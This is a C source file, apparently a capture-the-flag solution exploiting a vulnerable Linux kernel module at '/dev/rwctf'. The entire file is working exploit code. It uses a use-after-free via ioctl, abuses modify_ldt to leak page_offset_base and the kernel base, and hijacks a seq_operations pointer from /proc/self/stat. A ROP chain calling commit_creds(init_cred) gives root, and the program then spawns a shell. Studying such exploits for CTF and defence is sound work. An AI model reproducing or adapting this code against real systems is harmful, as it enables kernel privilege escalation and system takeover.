#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <linux/keyctl.h>
#include <ctype.h>
#include <pthread.h>
#include <sys/types.h>
#include <linux/userfaultfd.h>
#include <sys/sem.h>
#include <semaphore.h>
#include <poll.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <asm/ldt.h>
#include <sys/shm.h>
#include <sys/wait.h>

#define SECONDARY_STARTUP_64 0xffffffff81000060
size_t pop_rdi = 0xffffffff8106ab4d; // pop rdi ; ret
size_t init_cred = 0xffffffff82850580;
size_t commit_creds = 0xffffffff81095c30;
size_t add_rsp_xx = 0xFFFFFFFF812A9811;// FFFFFFFF813A193A; 
size_t swapgs_kpti = 0xFFFFFFFF81E00EF3;

struct node {
	int idx;
	int size;
	char* ptr;
};

void err_exit(char *msg)
{
    printf("\033[31m\033[1m[x] Error at: \033[0m%s\n", msg);
    sleep(5);
    exit(EXIT_FAILURE);
}

void info(char *msg)
{
    printf("\033[32m\033[1m[+] %s\n\033[0m", msg);
}

void hexx(char *msg, size_t value)
{
    printf("\033[32m\033[1m[+] %s: %#lx\n\033[0m", msg, value);
}

void binary_dump(char *desc, void *addr, int len) {
    uint64_t *buf64 = (uint64_t *) addr;
    uint8_t *buf8 = (uint8_t *) addr;
    if (desc != NULL) {
        printf("\033[33m[*] %s:\n\033[0m", desc);
    }
    for (int i = 0; i < len / 8; i += 4) {
        printf("  %04x", i * 8);
        for (int j = 0; j < 4; j++) {
            i + j < len / 8 ? printf(" 0x%016lx", buf64[i + j]) : printf("                   ");
        }
        printf("   ");
        for (int j = 0; j < 32 && j + i * 8 < len; j++) {
            printf("%c", isprint(buf8[i * 8 + j]) ? buf8[i * 8 + j] : '.');
        }
        puts("");
    }
}

/* bind the process to specific core */
void bind_core(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf("\033[34m\033[1m[*] Process binded to core \033[0m%d\n", core);
}

int rw_fd;
int seq_fd;
void add(int idx, int size, char* ptr)
{
	struct node n = { .idx = idx, .size = size, .ptr = ptr };
	ioctl(rw_fd, 0xDEADBEEF, &n);
//	if (ioctl(rw_fd, 0xDEADBEEF, &n) < 0) info("Copy error in add function");
}

void dele(int idx)
{
	struct node n = { .idx = idx };
	ioctl(rw_fd, 0xC0DECAFE, &n);
}

int main(int argc, char** argv, char** env)
{
	bind_core(0);
	int qid;
	char buf[0x10] = { 0 };

	rw_fd = open("/dev/rwctf", O_RDWR);	
	if (rw_fd < 0) err_exit("Failed to open /dev/rwctf");

	add(0, 0x10, buf);
	dele(0);

	size_t page_offset_base = 0xffff888000000000;
	size_t temp;
	int res;
	int pipe_fd[2];
	size_t kernel_offset;
	size_t* ptr;
	size_t search_addr;
	struct user_desc desc = { 0 };
	desc.base_addr = 0xff0000;
	desc.entry_number = 0x8000 / 8;
	syscall(SYS_modify_ldt, 1, &desc, sizeof(desc));
	while (1)
	{
		dele(0);
		*(size_t*)buf = page_offset_base;
		*(size_t*)(buf+8) = 0x8000 / 8;
		add(0, 0x10, buf);
		res = syscall(SYS_modify_ldt, 0, &temp, 8);
		if (res > 0) break; 
		else if (res == 0) err_exit("no mm->context.ldt");
		page_offset_base += 0x4000000;
	}	
	hexx("page_offset_base", page_offset_base);
	
	pipe(pipe_fd);
	ptr = (size_t*) mmap(NULL, 0x8000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);;
	search_addr = page_offset_base;
	kernel_offset = -1;
	while(1)
	{
		dele(0);
		*(size_t*)buf = search_addr;
		*(size_t*)(buf+8) = 0x4000 / 8;
		add(0, 0x10, buf);
		res = fork();
		if (!res)
		{
			syscall(SYS_modify_ldt, 0, ptr, 0x4000);
			for (int i = 0; i < 0x800; i++)
				if (ptr[i] > 0xffffffff81000000 && (ptr[i]&0xfff) == 0x060)
					kernel_offset = ptr[i] - SECONDARY_STARTUP_64; 
			write(pipe_fd[1], &kernel_offset, 8);
			exit(0);
		}
		wait(NULL);
		read(pipe_fd[0], &kernel_offset, 8);
		if (kernel_offset != -1) break;
		search_addr += 0x4000;
	}
	hexx("kernel_offset", kernel_offset);

	puts("Hijack the Program Execution Flow");
	pop_rdi += kernel_offset;
	init_cred += kernel_offset;
	commit_creds += kernel_offset;
	swapgs_kpti += kernel_offset;
	add_rsp_xx += kernel_offset;
	hexx("add_rsp_xx", add_rsp_xx);

	add(0, 0x20, buf);
	dele(0);

	seq_fd = open("/proc/self/stat", O_RDONLY);		
	dele(0);
	add(0, 0x20, &add_rsp_xx);

	asm(
	"mov r15, pop_rdi;"
	"mov r14, init_cred;"
	"mov r13, commit_creds;"
	"mov r12, swapgs_kpti;"
	);
	read(seq_fd, buf, 8);
	hexx("UID", getuid());
	system("/bin/sh");
        return 0;
}
